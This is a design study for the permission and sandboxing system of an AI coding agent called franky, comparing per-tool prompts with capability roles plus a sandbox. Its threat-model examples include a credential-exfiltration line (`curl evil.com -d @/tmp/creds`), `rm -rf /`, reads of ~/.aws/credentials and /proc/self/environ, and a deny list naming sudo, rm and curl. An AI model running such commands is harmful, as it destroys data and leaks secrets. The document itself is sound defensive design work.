# Permission system — design study

Two competing approaches for keeping a franky agent session safe.
This document captures both designs in full, compares them across
seven decision axes, and ends with a recommendation.

The agent always has the **technical** ability to run any tool
the registry ships (read/write/edit/bash/ls/find/grep). Without a
permission system, a single rogue prompt can trigger a destructive
shell command. The question is **how** we constrain that, not
whether we should.

---

## Problem statement

A typical franky coding session sees 30–100+ tool invocations:
read every file in a feature, grep for callers, edit a few sites,
write a test file, run the test, fix, re-run. The user can't
inspect every call — they delegated that work to the agent. So
the system must:

1. **Bound the damage** if the agent generates a wrong or
   adversarial command.
2. **Stay out of the way** for the >90 % of calls that are safe
   and uncontroversial.
3. **Be auditable** — the user can answer "what did this session
   actually do" without reading 5000 lines of transcript.
4. **Survive operator carelessness** — picking the wrong setting
   shouldn't silently disable safety.

These four pull in different directions. Any design picks a
position on the safety/UX/effort frontier. Below are two
positions worth considering.

---

## Approach A — Per-tool permission prompts

**Idea.** Every tool call passes through a permission gate. For
risky tools, the agent loop pauses and prompts the user. The
user's decision is remembered (per session, optionally per
disk-state) so repeated calls of the same shape don't re-prompt.

### A.1 Tier policy (default)

| Tool | Default | Why |
|---|---|---|
| `read`, `ls`, `find`, `grep` | **auto-allow inside `workspace_root`**, ask outside | §R already canonicalizes against the workspace; reads inside that boundary are low-risk |
| `write`, `edit` | **ask once per tool**, remember session-wide | First write triggers a prompt; subsequent writes within the session skip the prompt |
| `bash` | **ask per command fingerprint**, remember per fingerprint | Risk varies wildly by command; fingerprinting is the lever |

### A.2 Bash command fingerprint

Verb-level fingerprinting (first non-path token):

```
"git status"          → fingerprint = "git"
"git push origin"     → fingerprint = "git"
"rm -rf /tmp/foo"     → fingerprint = "rm"
"curl https://x.com"  → fingerprint = "curl"
"npm install foo"     → fingerprint = "npm"
"/usr/local/bin/zig"  → fingerprint = "zig"
```

Coarse enough that the user makes ~5–10 decisions per session;
fine enough that `rm` and `git` are distinct. Argv-prefix
matching (`git status` vs `git push` as separate fingerprints)
is a v2 extension.

### A.3 Decision values

```
allow_once       — this single call only
deny_once        — this single call only
always_allow     — for the rest of this session, this fingerprint
always_deny      — for the rest of this session, this fingerprint
```

`always_*` writes to an in-memory `PermissionStore` keyed by
`{tool, fingerprint}`. Disk persistence is **opt-in** via
`--remember-permissions` so a session never silently inherits
"always allow" from a prior run.

### A.4 Pause / resume protocol

The current `before_tool_call` hook is synchronous. Permission
prompts need to **block the agent worker** while the UI thread
prompts the user. Cleanest path:

```
[worker thread]                          [main UI thread]

before_tool_call → check PermissionStore
   ├─ auto-allow  → continue executing
   ├─ auto-deny   → synthesize tool error
   └─ ask:
        emit `tool_permission_request` event
        wait on Condition variable
                                         receive event
                                         paint modal:
                                           "bash: rm -rf /tmp/foo
                                            [a]llow once  [A]lways
                                            [d]eny once   [D]eny always"
                                         read keystroke
                                         Agent.resolvePermission(decision)
                                           → write store + signal Condition
        ←──── wakes up ─────────────────
        applies decision:
          allow* → execute tool
          deny*  → synthesize error result
```

New surface: `tool_permission_request` agent event,
`Agent.resolvePermission(call_id, Decision)`, `Condition` +
`Decision` slot per pending call on `SessionBinding`.

### A.5 Mode-specific UX

| Mode | Behavior |
|---|---|
| **Interactive** | Modal overlay (matches `?` help / palette). Single keystroke decides; transcript logs ✓/✗ lines |
| **Print** | Cannot prompt. Default: read-only auto-allowed, others auto-denied unless `--allow-tools <csv>` is passed. `--yes` / `-y` accepts every prompt (CI) |
| **RPC** | `tool_permission_request` is a JSON-RPC notification; client replies via `permission/resolve` |

### A.6 Storage

`$FRANKY_HOME/permissions.json` (sibling to `auth.json`):

```json
{
  "version": 1,
  "default_policy": {
    "read": "auto", "ls": "auto", "find": "auto", "grep": "auto",
    "write": "ask", "edit": "ask",
    "bash": "ask"
  },
  "always_allow": { "bash": ["git", "ls", "cat"] },
  "always_deny":  { "bash": ["sudo", "rm", "curl"] }
}
```

### A.7 Implementation cost

| Milestone | Scope | LOC |
|---|---|---|
| v1.4.0 | `permissions.zig` (Store + fingerprint), wire into `before_tool_call`, settings layer, JSON round-trip | ~250 |
| v1.4.1 | Async pause/resume protocol; new event type; print-mode `--allow-tools` / `--yes` | ~150 |
| v1.4.2 | Interactive modal overlay + key routing | ~200 |
| v1.4.3 | RPC `tool_permission_request` notification + `permission/resolve` method | ~80 |
| v1.4.4 | `--remember-permissions` disk persistence | ~50 |
| v1.4.5 | `/permissions` slash command (show / clear / revoke) | ~80 |
| **Total** | | **~810 LOC, ~30 tests** |

### A.8 Pros

- **Fine-grained.** A bad `rm -rf` gets caught before it runs;
  a good `git status` doesn't.
- **In-band.** Works without any external infrastructure (no
  Docker, no VM, no devcontainer setup). Install franky and go.
- **Audit-friendly.** Every gated call lands in the transcript
  with the decision attached.
- **Defense in depth.** Even if a future bug bypasses
  workspace-root path-safety, the permission prompt is a second
  check.

### A.9 Cons

- **Prompt fatigue.** A long session with novel commands hits
  10–15 prompts. Users will mash `A` (always allow) on
  inappropriate things to keep moving.
- **Session memory is dangerous.** Once "always allow `bash:rm`"
  is granted, every subsequent `rm` sails through. Including the
  ones the user didn't anticipate.
- **Implementation surface is large.** Async pause/resume, modal
  UI, three modes, RPC events, disk persistence. ~800 LOC + the
  agent-loop change is non-trivial and adds a new failure mode
  (what if the worker pauses but the UI thread crashes?).
- **No protection from supply-chain.** A poisoned model that
  emits "rm -rf /" still has to ask, sure — but the user is
  five hours into a session and reflexively hits `A`.
- **Doesn't help with reads.** A model that exfiltrates secrets
  through `read /home/user/.aws/credentials` and then asks the
  user "shall I summarize this for you?" is a permission-system
  failure. Path-safety helps, but the prompt model assumes the
  user reads every prompt carefully.

---

## Approach B — Roles + sandboxed runtime

**Idea.** The user picks one of 3–4 **capability roles** at
startup. The role determines which tools are even *available*
to the model. Within the role, no further prompts. The actual
**safety bound** comes from running the agent in a sandbox
(Docker container, lightweight VM, devcontainer) so even a
catastrophic mistake is bounded by the sandbox's filesystem and
network policy.

### B.1 Roles

| Role | Tools enabled | Use case |
|---|---|---|
| **`read`** | `read`, `ls`, `find`, `grep` only (workspace-scoped) | Code review, exploration. Zero side effects |
| **`plan`** | `read`-family + `write` + `edit` (workspace-scoped, **no bash**) | Refactors, doc updates, code generation. Model proposes, user runs |
| **`code`** | `plan` tools + `bash` (cwd locked to `workspace_root`, env denylist active) | Default for sandboxed runs. Model can write tests + run them |
| **`full`** | Every tool, no restrictions | Power user in a trusted sandbox or VM |

Role is selected via `--role <name>`, default `plan` (least
disruptive that's still useful).

The role binds at session init — there's no mid-session
escalation. To change roles, restart franky. This is intentional:
escalation paths in security designs are reliable bug surfaces.

### B.2 Implementation

```zig
// src/coding/role.zig
pub const Role = enum { read, plan, code, full };

pub const ToolSet = struct {
    read: bool, ls: bool, find: bool, grep: bool,
    write: bool, edit: bool, bash: bool,

    pub fn forRole(r: Role) ToolSet { … }
};
```

The session binding consults `ToolSet.forRole(cfg.role)` and
**only registers** the allowed tools. The model never sees a
disabled tool in its tools-list, so it doesn't know to ask. No
runtime gate needed — the model literally cannot call what it
can't see.

`bash` in `code` role still uses the existing §R workspace cwd
lock + env denylist + shell-trust policy. `full` removes those.

### B.3 Sandbox patterns (the actual safety story)

The point of B is that **roles are about capability, sandboxes
are about damage**. franky ships:

1. **`docker/sandbox.Dockerfile`** — minimal Debian image with
   Zig-built franky binary, a non-root user, `/workspace` mount
   point. The recommended invocation is:

   ```sh
   docker run --rm -it \
     -v "$PWD":/workspace \
     -v "$HOME/.franky":/root/.franky:ro \
     -e ANTHROPIC_API_KEY="$ANTHROPIC_API_KEY" \
     --network=bridge \
     franky-sandbox \
     franky --role code --mode interactive
   ```

   - `:ro` on `~/.franky` mounts auth.json read-only — the
     container can use credentials but can't overwrite them.
   - `--network=bridge` lets the agent talk to the LLM provider
     but doesn't expose host services.
   - `/workspace` is the only writable mount. `rm -rf /` inside
     the container hits the container's overlay filesystem, not
     the host.

2. **`docs/sandbox.md`** — recipes for VS Code devcontainers,
   Podman, systemd-nspawn, Lima (macOS), and bare-metal (with
   strong warnings).

3. **A startup banner** — when franky detects it's *not* running
   in a container (no `/.dockerenv`, no `/run/.containerenv`)
   and the role is `code` or `full`, it prints a yellow warning:

   ```
   ⚠ Running outside a sandbox with role=code. Tool calls
     execute on the host filesystem. Consider:
       franky-docker code      (recommended)
       franky --role plan      (no bash, safer)
   ```

   The warning is a single line, doesn't block, but is
   impossible to miss.

### B.4 Mode-specific UX

| Mode | Behavior |
|---|---|
| **Interactive** | `--role` flag at startup. Status bar shows the active role: `interactive · claude-opus · role=code`. No mid-session prompts |
| **Print** | Same — role binds at startup, runs to completion. CI defaults to `--role read` unless explicitly upgraded |
| **RPC** | Role is part of the session-init message; clients (IDE plugin) pick the role for the session up front |

### B.5 Implementation cost

| Milestone | Scope | LOC |
|---|---|---|
| v1.4.0 | `src/coding/role.zig` + `Role.forRole(r)` + `--role` CLI flag + tool-registry filter at session init + 6 unit tests | ~150 |
| v1.4.1 | `docker/sandbox.Dockerfile` + `docker/franky-docker` shell wrapper + `docs/sandbox.md` | docs only |
| v1.4.2 | Sandbox-detection startup banner; warning printed when `code`/`full` runs outside a container | ~50 |
| v1.4.3 | Status-bar role indicator (interactive); `/role` slash command (read-only — shows current role) | ~30 |
| **Total** | | **~230 LOC, ~10 tests** |

### B.6 Pros

- **Tiny implementation.** ~3.5× less code than Approach A. No
  agent-loop pause, no async protocol, no modal UI, no
  persistence layer, no RPC event surface.
- **Zero prompts.** Once the user picks a role, the session
  flows uninterrupted. No prompt fatigue, no mash-A-to-continue
  failure mode.
- **Strong safety bound.** A sandboxed `bash rm -rf /` damages
  the container's overlay filesystem, not the host. Recovery
  is `docker rm` + restart. Far stronger than "the user clicked
  deny in time".
- **Model can't ask for what it doesn't see.** Removing
  `bash` from the tool list under `--role plan` means the model
  never even tries — no prompt UX needed.
- **Industry alignment.** This matches how Claude Code, Cursor's
  agent mode, devcontainers, and `replit/agent` actually work
  in practice. Users already understand the model.
- **Auditability is structural.** "What did this session do?"
  is bounded by "what does role=X allow" — small enumeration,
  not a per-call audit.

### B.7 Cons

- **Coarser than per-tool prompts.** If the user picks `code`,
  the model can run *any* bash command. `git status` and
  `rm -rf /` are equally allowed (within the sandbox).
- **Hard dependency on sandbox setup** for safety. Users who
  install franky bare-metal and pick `--role code` get the
  startup warning but no enforcement. The safety story
  *requires* the user to do the Docker step.
- **Higher operational entry barrier** — installing Docker,
  building/pulling the image, mounting the workspace correctly.
  More moving parts than `brew install franky && franky`.
- **No fine-grained refusal.** "Allow `git`, deny `curl`" needs
  a separate mechanism (Approach A) layered on top.
- **Sandbox escapes are real.** Container escapes happen.
  Approach A's prompt is a second line of defense; Approach B
  is "trust the sandbox or don't run risky roles".
- **Network is the weak spot.** `--network=bridge` lets the agent
  reach `*.anthropic.com` *and* `evil.com`. Locking the network
  to provider hosts only is its own substantial design.

---

## Comparison

Across seven decision axes:

| Axis | A: per-tool prompts | B: roles + sandbox |
|---|---|---|
| **Safety floor** (worst case) | Bounded by user's prompt-vigilance. A tired user says yes to a wrong call → host damage | Bounded by sandbox isolation. A wrong call → container overlay damage, recoverable |
| **Safety ceiling** (best case) | Excellent for careful users. Per-call audit | Excellent if sandbox is correctly configured |
| **UX during a session** | 5–10 prompts/session. Annoying but informative | Zero prompts. Status bar shows role |
| **Auditability** | Per-call: every gated decision in transcript | Per-session: role bound + sandbox boundary |
| **Implementation effort** | ~810 LOC, 6 sub-milestones, async pause/resume | ~230 LOC, 4 sub-milestones, mostly tool-list filter + docs |
| **Operational entry barrier** | None — install + run | Install franky + Docker + image + mount workspace |
| **Failure mode** | Prompt fatigue → user permits dangerous call | Wrong role + bare-metal run → no enforcement |

**Key observation: they're not mutually exclusive.** Roles bound
the *capability ceiling*; per-tool prompts gate *specific calls*
within that ceiling. A hybrid is possible (and probably correct
long-term): use roles + sandbox as the primary mechanism, layer
prompts as a secondary opt-in for users who don't sandbox.

---

## Recommendation

**Ship Approach B first** (v1.4.x line). Reasons in order:

1. **3.5× less code, 4× faster to ship.** A working safety story
   in days vs weeks. Lower implementation risk too — no new
   threading primitives, no async protocol, no UI overlay.

2. **Stronger safety floor.** Sandbox isolation beats per-call
   prompts under realistic conditions (tired user, novel command,
   "always allow" creep). Approach A's strongest case is a
   careful user; Approach B's worst case is a careless one.

3. **Industry default.** Users coming from Claude Code, Cursor,
   devcontainers, GitHub Codespaces already know the role + sandbox
   model. Matches their muscle memory.

4. **Composable.** A future v1.5 can layer Approach A *inside*
   Approach B as `--prompts` opt-in for users who want fine
   control on top of role bounds. The reverse — adding roles on
   top of prompts — is harder because the prompt machinery
   doesn't go away.

**Suggested execution order:**

- **v1.4.0** — `Role` enum + `--role` flag + tool-registry filter
  + sandbox-detection warning + 10 tests. ~200 LOC, ~1 day.
- **v1.4.1** — `docker/sandbox.Dockerfile` + recommended
  `franky-docker` wrapper + `docs/sandbox.md`. Docs-only.
- **v1.4.2** — Status-bar role indicator + `/role` read-only slash
  command. ~30 LOC.
- **v1.5.0** *(later, if user demand surfaces)* — opt-in per-tool
  prompts via `--prompts` flag. Reuses the design from
  Approach A; built on top of the role layer rather than replacing
  it.

**Hybrid in practice:**
- Default user (no sandbox, default `--role plan`): zero bash, no
  prompts, can edit files in workspace. Safe by default.
- Power user (sandbox + `--role code`): full coding capability,
  zero prompts, damage bounded by container.
- Cautious user (sandbox + `--role code --prompts`): full
  capability + fine-grained per-call prompts as belt-and-braces.

---

## Open questions if we go with Approach B

1. **Do we ship the Dockerfile + wrapper in this repo, or as a
   sibling project?** Sibling preserves the one-way layering
   (§O) — `franky-docker` is a deployment concern, not a code
   concern. Sibling.

2. **Sandbox-detection logic.** Check `/.dockerenv` (Docker),
   `/run/.containerenv` (Podman), `$container` env var (systemd-
   nspawn), `/proc/1/cgroup` (legacy). Combine.

3. **Should `--role full` exist?** Argument for: power users.
   Argument against: it's a sharp tool. Compromise: ship it,
   but require `--role full --i-know-what-im-doing` (or a
   confirmation prompt at startup) so it's never accidentally
   selected.

4. **Per-role cwd policy.** `read` reads anywhere inside
   `workspace_root`. Should `code`'s `bash` be allowed to `cd /tmp`?
   Yes inside a sandbox (the entire container *is* the blast
   radius), no on bare metal. Wire this through the existing §R
   `path_safety` module rather than duplicating the check.

5. **Provider-network locking.** Out of scope for v1.4.x; tracked
   as a v1.5+ concern. Sandbox-side can pin DNS to provider hosts
   via `--add-host` + `--network none`, but operationally messy.

---

## Roadmap — role-first (refined, v1.4.x milestone line — ✅ all shipped at binary v1.9.0–v1.9.5)

> **Status (2026-04-25):** all six milestones (v1.4.0–v1.4.5
> below) shipped. They map to binary versions v1.9.0–v1.9.5;
> the "v1.4.x" labels in this doc are step IDs internal to this
> roadmap, not binary versions. See `../../spec/v1.md` §5.10
> for the design and the v1.9.0 → v1.9.5 row in the
> "What shipped" log.

Approach B chosen as the primary mechanism. Three refinements
based on the second design pass:

1. **Runtime role gate (defense-in-depth).** Filtering the
   tool registry at session init isn't enough on its own. A
   model can emit a `tool_call` event for any tool name string
   — including ones it picked up from prior conversation memory
   or from training data ("I remember bash exists in this
   environment"). Today such calls would surface as a generic
   "tool not found in registry" error; we want them to fail
   with a **structured `role_denied`** so the model gets a
   clean signal to pivot.
2. **Mode coverage extends to proxy + Slack-bot pattern.**
   Print / interactive / rpc / proxy (web UI is shipped) /
   `franky-do` (Slack-bot sibling, post-1.0) — each surface
   needs to express the active role and report
   role-denial cleanly.
3. **Sandbox via zerobox, not Docker.** Zerobox is a single
   binary (~7 MB, ~10 ms overhead) that uses macOS Seatbelt
   + Linux bubblewrap+seccomp natively. It also ships a
   **domain-level network firewall** and a **credential
   placeholder system** that hides API tokens from the
   sandboxed process. No image build, no daemon, no mount
   ceremony. See https://github.com/afshinm/zerobox.

### Roles (final)

| Role | Tools available (registered) | Workspace policy | Network policy (sandbox-side) |
|---|---|---|---|
| **`read`** | `read`, `ls`, `find`, `grep` | Read-only inside `workspace_root` | LLM-provider hosts only |
| **`plan`** | `read`-family + `write`, `edit` | Read + write inside `workspace_root` | LLM-provider hosts only |
| **`code`** | `plan` + `bash` (cwd-locked, env-denylisted, shell-trusted) | Same + `bash` writes anywhere reachable from workspace | LLM-provider hosts only by default; `--network=open` opt-in |
| **`full`** | All tools, no §R restrictions | Anywhere on host | Open |

Default role: **`plan`** (least disruptive that's still useful;
matches "zero risk of arbitrary execution out of the box").
Selected via `--role <name>`; binds at session init; no
mid-session escalation.

### Refinement #1 — runtime role gate

Two-layer check:

```
[layer 1: registration]
  Session init reads cfg.role.
  Tool registry only contains entries permitted by role.
  Model's tool-list (the schema sent in the system prompt)
  reflects the filtered set — model literally doesn't see
  disabled tools.

[layer 2: runtime gate]
  When a tool_call event arrives:
    if tool name is registered  → execute normally
    else if tool name is a *known* franky tool but role-disabled:
      → emit `tool_execution_start` with the requested name
      → emit `tool_execution_end` with is_error=true,
         tool_code = "role_denied"
         message  = "tool '{name}' is not available under role '{role}'.
                     Available tools: {list}. To enable, restart
                     with --role {min_role_that_allows} (and ensure
                     a sandbox is in place for risky roles)."
      → loop continues (model can pick a different approach)
    else:
      → existing "unknown tool" path (already returns is_error=true)
```

Why structured `role_denied` instead of "tool not found":
- Model can recover ("I'll write a script for the user to run
  instead") rather than thrashing on "I keep getting tool not
  found errors, the bash tool must exist somewhere".
- Audit log is precise — operator sees "agent tried bash
  during a plan-role session" rather than "agent emitted a
  garbage tool name".
- Future v1.5 per-tool prompts (Approach A) reuse the same
  `tool_code` value — `role_denied` becomes one of several
  refusal subcodes alongside `permission_denied`,
  `path_escape_workspace`, etc.

Code surface: extend `before_tool_call` to consult a new
`Role` parameter on `Config`; new `errors.ToolCode` constant
`"role_denied"`. ~30 LOC.

### Refinement #2 — mode-specific surfacing

| Mode | Role surfacing | Role-denial UX |
|---|---|---|
| **print** | `--role` flag at startup. Single line on stderr at session start: `franky · role=plan · sandbox=zerobox`. CI default: `--role read` unless caller upgrades | Tool result with `[role_denied]` prefix lands in transcript; agent continues |
| **interactive** | Status bar shows `· role=plan ·` between provider and elapsed-time. `/role` slash command shows current + permitted tools (read-only — no escalation). Help overlay (`?`) lists active role | Inline `✗ role denied: bash needs role=code` in scrollback (red, same QW4+5 styling) |
| **rpc** | Role is part of `version` response (`{"franky":"1.x","role":"plan"}`). Optional `role` method returns `{role, allowed_tools, sandbox_detected}` | Standard tool-result event; `is_error=true` + `tool_code:"role_denied"` |
| **proxy (web UI)** | Role visible in web UI header next to model selector (read-only badge). New endpoint `GET /role` returns `{role, allowed_tools, sandbox}`. Web-UI sidebar shows role pill on each session card | SSE event `tool_execution_end` carries `tool_code` field (already in spec); web UI renders role-denied tool cards with a yellow border + "tool not in current role" caption |
| **franky-do (Slack bot, sibling §O)** | Bot starts with `--role plan` by default (no `bash` for untrusted Slack input). Per-channel override via Slack admin command (`/franky role code` in a moderator-allowlisted channel) — entirely the bot's concern, franky just exposes the role flag | Slack ephemeral message: "🚫 bot can't run shell commands in this channel. Ask an admin to enable `code` role" |

The proxy and Slack-bot integrations are the load-bearing
reason for **structured `role_denied`** vs free-form text:
those clients render the failure as a UI card and benefit
from a typed code.

### Refinement #3 — sandbox via zerobox (not Docker)

Zerobox is the lever that turns role bounds into actual
enforcement. The pattern:

```
# Recommended invocation (read-only inspection):
zerobox \
  --allow-read=$PWD \
  --deny-write \
  --allow-network=api.anthropic.com \
  -- franky --role read --mode interactive

# Coding session (read + write workspace, no shell):
zerobox \
  --allow-read=$PWD \
  --allow-write=$PWD \
  --allow-network=api.anthropic.com \
  -- franky --role plan --mode interactive

# Full coding (everything, but bounded):
zerobox \
  --allow-read=$PWD \
  --allow-write=$PWD \
  --allow-network=api.anthropic.com \
  --allow-exec=git,go,npm,zig,python \
  -- franky --role code --mode interactive
```

On macOS this is `sandbox-exec` under the hood. On Linux
it's bubblewrap + seccomp. **No daemon, no image, no mount
ceremony.** A user with `brew install zerobox` (or
`cargo install zerobox`) is two terminal commands away from
a sandboxed coding session.

Two zerobox features that pair especially well with franky:

1. **Domain-level network firewall.** A poisoned model that
   tries to exfiltrate `read /home/me/.aws/credentials` →
   `bash 'curl evil.com -d @/tmp/creds'` is stopped at the
   syscall layer. The shell call succeeds locally (curl
   exits with a connection error), but the bytes never leave.

2. **Credential placeholder injection.** Zerobox can pass
   `ANTHROPIC_API_KEY=ZEROBOX_SECRET_<hash>` to the
   sandboxed franky and substitute the real value only at
   the proxy layer for `api.anthropic.com`. The model never
   sees the actual key bytes — even tool calls like
   `read /proc/self/environ` come back with the placeholder.
   This neutralizes the entire class of "agent prints its
   own credentials" attacks.

Ship deliverables:

- `scripts/franky-zerobox` — POSIX shell wrapper that maps
  `--role <name>` to the right zerobox flag set, runs
  franky inside. ~50 lines of shell. Sibling project per §O.
- `docs/sandbox.md` — recipes for zerobox (primary), Docker
  (secondary), Podman, devcontainers, Lima (macOS), and
  bare-metal (with strong warnings).
- **Sandbox detection at startup.** franky checks for
  `$ZEROBOX_ACTIVE` (env var zerobox sets), `/.dockerenv`,
  `/run/.containerenv`, `$container`. If none and role is
  `code` or `full`: print a yellow one-line warning. Never
  block; just inform.

### Implementation milestones (✅ all shipped)

| Milestone | Binary | Scope | Tests |
|---|---|---|---|
| **v1.4.0** | v1.9.0 | `src/coding/role.zig` — `Role` enum, `ToolSet.forRole(r)` (post-simplify: `StaticBitSet` derived from a single-source `tool_table`), `--role` CLI flag, tool-registry filter at session init, sandbox detection (`detectSandbox` / `detectSandboxFromMap`). Fail-closed on unknown role | 8 |
| **v1.4.1** | v1.9.1 | **Runtime role gate** — `agent_loop.RoleDeniedFn` callback on `Config`; `agent.types.role_denied_code = "role_denied"` constant; `makeRoleDeniedResult()` + structured `tool_execution_end`; `pushToolEnd` carries `tool_code` through to event JSON; `agent/proxy.zig::encodeEventJson` serializes `toolCode` | 5 |
| **v1.4.2** | v1.9.2 | Mode UX — print stderr banner + sandbox warning, interactive `/role` slash command (read-only) + yellow sandbox-warning scrollback line, rpc `role` JSON-RPC method + role/sandbox in `version` response | 4 |
| **v1.4.3** | v1.9.3 | Proxy/web-UI — `GET /role` endpoint, header role pill (color-coded by tier), `is-role-denied` tool-card styling, web-UI `ROLE_DENIED` constant mirrors the Zig wire-format. New `proxy: GET /role exposes role + permitted tools` integration test | 3 |
| **v1.4.4** | v1.9.4 | Sandbox — `scripts/franky-zerobox` shell wrapper (sets `ZEROBOX_ACTIVE=1`, defaults `--role code`, allowlists provider domains), `docs/sandbox.md` (zerobox primary, Docker, devcontainer, Lima, bare-metal recipes, CI `--role read`) | docs |
| **v1.4.5** | v1.9.5 | Slack-bot pattern docs — franky-do section in `docs/sandbox.md` (untrusted-input posture, `--role plan` default, per-channel override pattern, public-channel checklist) | docs |
| **Simplify** | v1.9.5 | Code-review pass: shared `role.zig::renderRoleStatusJson` consolidates the proxy `respondRole` / rpc `writeRoleResult` JSON builders (kills 7-catch-block sprawl); `tool_table` becomes the single source of truth for tool name + min-role lookups; `RoleGate.init(role)` factory replaces hand-built struct literals at four sites; `Session.role` field dropped (the gate already carries it); `sandbox_env_vars` const dedupes the env list across both detectSandbox variants; web UI parallelizes boot fetches via `Promise.all`; narration comments stripped; one new test for `renderRoleStatusJson` | +1 |
| **Total** | | **~450 LOC role + simplify pass** | **+21 tests (698 total)** |

That's still 1.5× smaller than Approach A's ~810 LOC, ~30
tests — and the extra LOC vs the original Approach B
buys us the runtime gate (defense-in-depth), full mode
coverage, and a real sandbox path. The simplify pass cut
~80 lines net (extracted helpers shrink call sites more
than the helpers add).

### Implementation order rationale

- **v1.4.0 first** because it's pure-logic + has no
  dependencies. Tool registry filter is easy to test in
  isolation; sandbox-detection is a one-liner.
- **v1.4.1 next** because it's the load-bearing safety
  refinement (the runtime gate). Without it, a creative
  model can call tools "by name" via prior-conversation
  memory.
- **v1.4.2 + v1.4.3** parallelizable — interactive and
  proxy mode plumbing don't share code.
- **v1.4.4 + v1.4.5** are docs-only; can ship at any time
  but most useful after v1.4.0–v1.4.3 have shaken out.

### Out of scope (still — for any post-v1.9.5 follow-up)

- **Approach A's per-tool prompts.** Layered as `--prompts`
  opt-in for users who want belt-and-braces. Future work if
  demand surfaces.
- **Per-channel role overrides for franky-do.** That's the
  Slack bot's concern — franky exposes a stable `--role`
  flag and the bot owns its own admin UX (see
  `docs/sandbox.md` § "Slack bot — the franky-do pattern").
- **Multi-tenant role enforcement** in proxy mode. Single-
  user mode today. Multi-tenant proxy needs auth first;
  tracked separately.
- **Network firewall config in franky itself.** The network
  policy lives at the sandbox layer (zerobox or Docker
  network policy). franky asks "what's allowed?" but doesn't
  enforce.
- **Mid-session role escalation.** Deliberately *not* wired —
  escalation paths are reliable bug surfaces in capability
  designs. The `/role` slash command is read-only; to change
  role, restart franky with `--role <name>`. This invariant
  is documented at `src/coding/role.zig:19-22`.

## What both approaches share (do this either way)

- **§R path safety stays on.** Workspace-root canonicalization,
  env denylist, shell-trust policy — none of those go away
  regardless of approach. They're correctness guarantees, not
  permissions.

- **Audit log entries.** Every tool execution lands in the
  transcript with `tool_execution_start` + `tool_execution_end`
  events. The role/permission decision (whichever system we ship)
  attaches to those events as metadata.

- **Default deny on auth-related paths.** Reading `auth.json` or
  `permissions.json` (if we ship it) is never inside any role's
  scope. Hardcode that boundary.

- **Fail closed on misconfiguration.** Unknown role → refuse to
  start, don't fall back to `full`. Unknown tool in registry +
  role allowlist → refuse to register, don't silently skip.
